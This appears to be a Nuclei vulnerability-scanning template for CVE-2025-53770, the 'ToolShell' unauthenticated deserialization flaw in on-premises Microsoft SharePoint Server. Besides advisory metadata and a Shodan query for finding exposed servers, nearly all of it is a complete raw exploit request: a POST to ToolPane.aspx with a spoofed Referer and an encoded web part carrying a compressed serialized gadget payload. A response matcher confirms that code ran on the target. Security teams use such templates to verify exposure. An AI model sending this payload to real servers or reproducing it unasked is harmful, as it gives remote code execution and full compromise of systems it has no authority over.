id: CVE-2025-53770

info:
  name: Microsoft SharePoint Server - Remote Code Execution (ToolShell)
  author: _l0gg,SamIntruder,sfewer-r7,iamnoooob,pdresearch
  severity: critical
  description: |
    Deserialization of untrusted data in on-premises Microsoft SharePoint Server allows an unauthorized attacker to execute code over a network. Microsoft is aware that an exploit for CVE-2025-53770 exists in the wild. Microsoft is preparing and fully testing a comprehensive update to address this vulnerability. In the meantime, please make sure that the mitigation provided in this CVE documentation is in place so that you are protected from exploitation.
  impact: |
    Unauthenticated attackers can exploit unsafe deserialization to achieve remote code execution on SharePoint Server, leading to full system compromise.
  remediation: |
    Apply the latest security patches from Microsoft or implement the temporary mitigations provided in the CVE documentation until a comprehensive update is available.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-53770
    - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
    - https://x.com/codewhitesec/status/1944743478350557232
    - https://github.com/rapid7/metasploit-framework/pull/20409
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-53770
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.component:"sharepoint"
  tags: cve,cve2025,kev,sharepoint,rce,microsoft,toolshell

http:
  - raw:
      - |
        POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
        Host: {{Hostname}}
        Referer: /_layouts/SignOut.aspx
        Content-Type: application/x-www-form-urlencoded

        MSOTlPn_Uri={{Scheme}}%3a//{{Hostname}}/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3c%25%40%20Register%20Tagprefix%3d%22gizpnozlcjfutvbn%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22sjqjboucouuj%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3cgizpnozlcjfutvbn%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3csjqjboucouuj%3aExcelDataSet%20CompressedDataTable%3d%22H4sIAOUUgWgAA9Va6ZLiSJLu2WPMdmb3175AWv3t7kodKDspq2ozQAcoUYCOCCGNtdlIChUChYQSCQR6m32%2bfYhdF0dCVWXWNTO9tpkGCBHh4cfnX3hE6Ic//PDDD/8Df%2b1n%2b/fv/wRvyN6XVZy9loMq%2bOmGxOtyscrfdV5z7f9PN4MNqzbr%2bF0eb6p1wH66mW5Ctoge4r2zSuP8XfjLL4EUSXd8V%2bzE3H33X1vh/3kl8/Bmx1U71r/NMmZHSZwFf4YrefH%2bvbYOsj/8of3tj/8Mb//1p7e78k15aHKzy1hevnv16njxZgfXSVUVb25v67p%2bXYuvV%2bv5rcBx/O3MGB/FnttmJYVR373arPOTtPLnbBGtV%2bXqffVztMreQLufj61e3Szou1flKovbb2Vcvfr1P/5089Ffq1bM4izOq5s8yOIPO9wcJb0ZlSdj372q1pv46T4u48FmvYbO41UUsPj08zPjnMcCFQsW75x9Eb/Q6qllslpE8U22yCdRtFmDkzgYN9idv23ycLXJaUxfGu5lE5M4eVHJ71P4415l/LiJ8%2bhruzyvZlHnT55u/d/q8O7VCYKDFWNxVAGmy9danMfrRfR6vCirv/J/%2bcs1Su14vQU/lq9HeRWv84C9VnZF0PrNXQdFEa//Kjx1cOPwNR69Hq9KdbXOggo6/HRz%2be17sogT30vvf3nP81TiAjH47aensRY5XdXlUclJuARb2svperVd0Hbc6TouwRdBa6IK2RTXq3X6HSqIfPhevJfuAiredWJR%2bu23J5s%2bcNDfgSN%2b%2b%2b3VTXUIEsQyyPdtwF59iODbrwXR7beh6ND%2b67F6aH5C2%2bfy8PYpEV/K6S%2bP%2b5mxjlYeeOzXP/4L8OR/P7ylwJ7z9ZvjR5B9F/Ed%2bxxFfKnPeaCft/yzBHnFhy/5oOWTm5PeLec6QcguJLle1ZM1QPpAYKdWSVAOkiCfxwCKRV7G6%2brzPPYWuOBpulh8eb74GYRWAUDnMsnQr5hlvoSaj6hj8v6aKj5N4t9B45uvyY2z2soRhF%2bTg2/BhtacmMIFmFrtua/NXCOukhVFwFi/ykBh60XAFk389vbq/jdJmgYt%2b4GDy2%2bZTU7083uEAIS/OdMefVNW60U%2bf/Xrba3s%2bWWv1zPhNb2Fv/t%2b7%2bmvHrTvNkFSJFostOs5ycg%2bEtg2XHLceNnbGINOPR70ZeruODrT2dSVGJ1Ze8%2bty5Ha571sV3hcxWJibQOBbKbuSESCwnsNFgwnbZCG64mcqofxR2Yfi6yhGqnGKdqG2o55olWEgtSMU8pCGDtwjQ0Wuntok2KBcJ6shi5/1k9y6FAvwiwqRxrfeNAu1NgC9HP9md4EbnczdcyjzsteOVIQHw4tPspwF2Tz0DcJB/UcD8kC%2bi1tgUhE6659t9P1lpHoOWSJHG83cQzOd3qdCXQ5OovIoUg2tJfIocDXHvghmtOnMfuYcb7LN72e0evPF6j35E8J2u9K30Vc2y7aS0Mf/BdlbHmwf9ZP4LoB%2by9ys97O5SsnniGQyW2waIFPpBxsrCIBbaPW34t/VJygizk/YKI3b99S%2bepaad/7YGOvN/h/buPBlPFMuNavI4/Yk02K7%2b6YL6icT1BrSwJ4ufNmB6yOwN7Un430fovpvqJcfORpx7zyhu3746J3jzPSAHb2nkCU4OQj8IE0yJMq1KRmausrOrTqyeJ%2bC7avAEcJ%2bLCCtvtQRFs/NzeA82osUsC93xk3o9qQvW2sqVU46NYRyAd/c0fdOouz3Ek%2b746yhKPD3t1434VcSVjoqs044wtP1GGsbkYH0jIUuC0V2MbP51tj2avRotvxXL4czYtO6O42UVO0Oi7D4agKM7XyZ6j2XMQmZ185VRKJCGTrZezwV/EbPcQaX4a5cRctuYUn7PZjV0pClzSRpi59p7jEPyNZqJEl1dpYf1le4Hxeno3vf/FmCPzCL8Jh2g1naBmKehm4o4t/MgP8g8powW/AXhaJ/cQT8N2Fn9j0hN892HzI84mgNpFAKsCZNH3C/%2bhhOl/NR4PePfiqH%2bV6Etv9ziQFHIKevqZynj2ax3Khgd840ENyXMIFWjcFvzaTdozcZxHE2cr1bYj1JBKwgFTEAe42/n7042DRa%2bXPR/IO5Kp7XyRVG/Oo6Twc7p9e06Fxd86laTrnIo71TaweXhZWpwahkiGzJWH647hBMyvrrlBKLJvbzYjYn3h4RyzckQxO7YRyMrEIc8DnoouTRzunE0tlD2Gqb5BLH10ZGaGMGHWSNFAMwVB2j9hRERHVArCe2bxl%2b5o1sQV9GA8RttzEpYRCPIqOuSSPIe%2bv/CwV0WwOL6o5hDxCHAofAw83ER/nxca3q85DMxfjJSmRXYnU6fdtl90h7p4zOatjq2gMsiZUVtco62xRnqh0303o0IfYqxzW9Myd%2bftwqKxdte/5qYSMoSlQPrE8riNZw8KiGdoFGceBfCHQkBvYJY8Z1QzNkjFO9GDQvbOcRDZkdesM2Q7bXS9yDN7gyJQOR7vJTB24M5o7sh/Qpldbot8HfrIAibyNIyFiRLaYynvpzg6WzLFFfezK0Z4S348GpYBdMgsbC9M8qUOh4vFMXTocb3tcIlsa%2bJ%2bNagv8gBVJwJxkWSIdRqmaAR4TxFVL4LVO4O6WTr7aAvcVjqLaYdPfGkPk%2bqTHhUqiWA4NvIwZpkjsaEmmtiL1vRR8OCtmoZA8uJk1hnhZnmvyoaBb1rCvBZjbho0/CYRijzAaBErBtfhxs8Q3huoUiWChYvKBTDaTWbE2RbZAMqkD3rftlJec3HqwZmwVqn0FO55k8wjmbqMTpfwSCZ2OnxPkLH3L0dQ7n6dL5Coi4gnvuF4H5N8hoRYdlRUu8fdGBph01VnkGpK76DZGQ5QJ5lOaSjYSKNiqCD5WuUgr%2bYd9946KRe7LBPLdSqlWrg3RGlBCXC8tZIcjHVfh%2b4ApJXQS25HJIMwRYNVX8aBChlBtxiJ6oAytH7gdj4epMFEqbPO64WUS1CSd7QPIgNqBxQotgkyRAq6ujTzJaE77luA/tHikbld1gNECHmJBVoKtUc9zdAWrVm7NyNhoUuBy1TWywp/MWE1nIwF8HxAZqVRW1iHmA09QBaLpj1bGeCMjAyOr61DRO3Z63wCW9cjRH7HLkzHHjGipu66L97jpbS2MPMch6UT1VxjrQ5sk8oSgoTtDrp0XfVug62BpAiarMnBGnYj1%2b0au686QqnimI8olY1/RZ5agVyjXS3dIK6T5QqhUupmqARYK4jTEMQRdjjJ9FzYqCRoVW8pOD/fdBxujVcgS1XetKmCAuZRakSsVUCNYjlt5geKtQxcLgPokkpHucF3Tw9LWVuq15Sp7wPCOCKpLHWSbKb1zs2oT8JYRCangQ/742W7sEp3ZMu44Gc8CmB/JkOzGQmJ7Iit8gRqG2PdN7ImeW6GJk%2bjWrG/7DskgxztUtHzbTQTAp4CIlZiZKT2IHo8br6GZHyBcZX7aTX1NEmi%2b6gCt2Q8iGRF3tUMznz0Iqm1lScdjyQQ3uk3xXEIO8aGu9BDuehRbfpjjteP4OFhaK8JH6yhNOPg%2bjRUp8RX%2bDg%2bZZSz7Q2uIJcQVm1ClqU9We8gjPRIqB4lkipZYHAuVZMzwduIw5g7RHnIGx4yCjbxnujVniPoj1Va7gNE1Wprg02oL%2bg4imd3FMkuJSu8cUTXGXAo8qDbevlKjRZX7M5LGmrTDfCFhwTfokCiAhxSx/mrMFztHZGnUkFU8S2YGJqXL2DACvonzRLMbvxMugUMzfR0u/THUFxoeGpKf8ctQtQzf0QXIobt4RnTqWjkVVeSzljOLMdHmnLn0OA/PdybYEQ%2bjnS1AleXqBeBy086pmO9nwJV3ZNjXjSHm4yFgye46novFwAWb0vudozBpLEh9s0ks4JwFUeZ7P08YUSQd8phMXOTBfBQgrRoaPMy56mhtgO9CUWl8J2oo1127EDcMqwKMu2uYO4ZoVgiByIiRqilymTPBaO1l1iR0OzzMPbsoTTt%2batTAy7XX9CSc6cQgLMAZKwOoh6xMF%2bNclU1OmiKNPVokkTynv8VZMgsyQwhUlrgs8TDoirQdilwdEQ1wIABO%2baS0HN1FWbEiDjXheoG5AoeLag36jybuHPh/vkX7%2b3qCu8gS0Br8lI8bSzOBG1AmiSbuwlyvdKeDbgP12bF%2buKoR4P6z9cOhPdyPMlU61zKBUyCon7ZRzto1F/Ncrq1hxv4shbqJbaIh4dpaA%2bbZarS8GmM4vzNnek6hpgpzqznJO7/uoU8Cdd7yUhfj%2bVWNfJLftlEW02W9fab9VT1Ub0GnfpRRHurADcwvx9/g/jP6n37bLScpDYJZ/xm76N3V/cWV7vfPjnNVe4Fch0KtB3W7DfXiFtYnS9/uX67xsR6E2gy43rqM8SUbL/KXk4/qUccFjnI6NcTvpd%2b%2bJvYf%2b%2bPspydMjCCm7VoZ6tUFdaESh%2b9WpsLs1t3HmIdqKdn6Mre41L8SzAsEbCI6zK2c50rgi2%2bpY%2beQ%2b6wG/%2bF41mdOu%2b5wDvIH8cxio8X9h/45yGMbKhv76dLgJ7J5PxZBZ5BtNKOvwsuT7iefTZXuIshgTaK0sVHNKOsKUE%2bwaHGp7anG16NFf%2bplRbuPcbEVfot5dFiTeTysd4UuH2WIjbRrfPFd6Iv8mbUKBWvSrkHAvzbkU/pBPr2oh3Tua8J6sl0Hce1%2bxPflmw4MOvoRsPAphp1PY3P2q3H0J9htNsbyM%2b0a3EEvtIUxz/5TwF8JHupbmrF2fb05r5Owpu5b/wCe9le4fanfOd73jqA/tvsSVrsGI31YT/uFDzKu8AxrLd4IBfD5JY4HzMFvv4C%2bh%2bvRcAScdl5PsufidpTxoQ9eHH%2bcnnJGbfce2jU1xDP/fk7xcpLB2PfjZzD3AR4gBt%2bp0/2YewGHZ5vl3UvxuPBrbkmRRppvyxm1CfFu67nWc34fwvdDjKLrdfJ35M34zEGf8dHZl1/DDX7G9tEJS99k7/Doo/f2aH7G/5n/LIFwJFNL6uLFh3F90fefzaGP9w6u8xr48Lm8fhkHX%2bCjv1O%2bLp%2bZV%2bbnfqB/AzptgOMAa9VzuZMFoBNVDz5%2bDk8g12/3DtvaYQG6/QP8PL9zclKGg/vn8n0/Sdv9bQteVAs1NQcZvOGMYD4DDmrrOQ1enF96Lv2Y6891yoS6u3L87WMDdiU%2b1Ort7yL3H8RFgLMrfoTcOp4vJFGe/tjv4XZbdnHZ47NYqJEcYsmw0J49qGUwK5LDPmSabEMNZM7b/e7eyNJI6bsUfsPD8BRro0erI37MXa82ZEP9pv3j9UUmUaFW3sewxnl2T7TNrQMeAZ%2bZv31R18Xf2H%2bejlpjB2bafuiDw562ebj3N9tmRq0YhbZ1nZlc9nhNHzhQh/WoaUMs937LcW0bfNlrlXMLcEDZKW8PuTrIThhR2j1gjPxPxlP6vTm8TKP%2bpngvqot9uK0Rdak/L0F1eXR15qFR4B5P1v8Pz6a48mrsEy%2bZv9%2b52LxuDz/GV3vr5Uht97FRew7RRcexYMx6boqkpEOy9x1%2b488IrEvVEnQzqdv2Q1AbMBwKFQuX/AI1NEGuwaOlIhmNxQx5Lg3mHmrB46qH9U27rjzFzD9yLdgb7P8O50WOsfMyr5nIWPBcs0FLGL/BmtzmwaD/lFukPS/RumK0lxBgd01nvY3bnseobV3f5pE3PZyVEeCvHLGBdTgUUgbtedHgb83RYx4dagJz13/KI3zIA90Udm1uHXOEoMIH7jv43iycwKUbwH4b9/0AOBb6sYi1OYVNqC0gNjr442pdVrf5A6%2beMZIv2D/UNC7P6XJ9OBdER87otB%2baeviiP9l45viRevTFg/pJvhT95GNePvE7YAT82/h28slZ4YN5IKeHnrk6cNXB34nXfgxNoVtFLZeYqXG8f2iLnuSf90Zqzz8I4Y5rR8iL03kgXn3SFvD16b1U01rR8sXeUw01f9LhGd3HV1j6xJ4jVkZHvVve6e8%2bODO/nKfODVKFz%2bn5e%2bQkdNGPh8Or02d6cP7AOnw8DOp3797enh5/%2bOqnrb7zUYu3x4deRqcHJ64ehbh%2bMubVr29vP2z4VU90ffMjKG9vv/EBnc8%2b%2blXU%2bYsPfbVPPD37qNfLT0u9vf3oya5f//yn/wVflc42uisAAA%3d%3d%22%20DataTable-CaseSensitive%3d%22true%22%20runat%3d%22server%22/%3e%0a%20%20%20%20%3c/ProgressTemplate%3e%0a%20%20%3c/gizpnozlcjfutvbn%3aUpdateProgress%3e%0a

    matchers:
      - type: dsl
        dsl:
          - 'contains(x_nuclei,"CVE-2025-53770")'
          - 'contains(body,"MSOTlPn_DWP")'
        condition: and